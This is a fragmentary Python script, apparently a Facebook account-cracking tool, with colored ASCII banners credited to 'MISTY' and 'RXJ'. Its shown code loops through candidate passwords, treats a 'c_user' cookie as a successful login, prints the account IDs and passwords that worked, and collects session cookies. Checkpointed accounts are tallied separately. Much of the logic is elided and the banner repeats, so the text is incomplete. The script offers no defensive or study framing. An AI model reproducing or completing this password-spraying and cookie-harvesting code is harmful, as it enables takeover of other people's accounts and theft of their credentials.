...
\033[1;37m=============================================================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mMISTY\33[0;m\033[1;32m && \033[1;33mRXJI\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m RXJ
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mMISTY-XD
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mRXJ 
...
########     ##     ##          ## 
##     ##     ##   ##           ## 
##     ##      ## ##            ##   AUTORJUTTBRAND XD RXJ JUTTSODHAIR     
########        ###             ## 
##   ##        ## ##      ##    ## 
##    ##      ##   ##     ##    ## 
##     ##    ##     ##     ######           
\033[1;37m=============================================================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mMISTY\33[0;m\033[1;32m && \033[1;33mjuttbrand\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m RXJ
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mMISTY-XD
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mRXJ 
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\r\033[1;32m[RXJ-OK] '+cid+' | '+ps)
				cek_apk(coki)
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\r\033[1;31m[RXJ-CP] '+cid+' | '+ps)
				...
				continue
		loop+=1
		sys.stdout.write(f"\r\x1b[1;32m[RXJ-RXJ]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [CP][{len(cps)}] ")
		sys.stdout.flush()
	except:
		pass
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write(f"\r \x1b[1;32m[ RXJ ]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [Cp][{len(cps)}]  ")
		sys.stdout.flush()
	except:
		pass
menu_apikey()
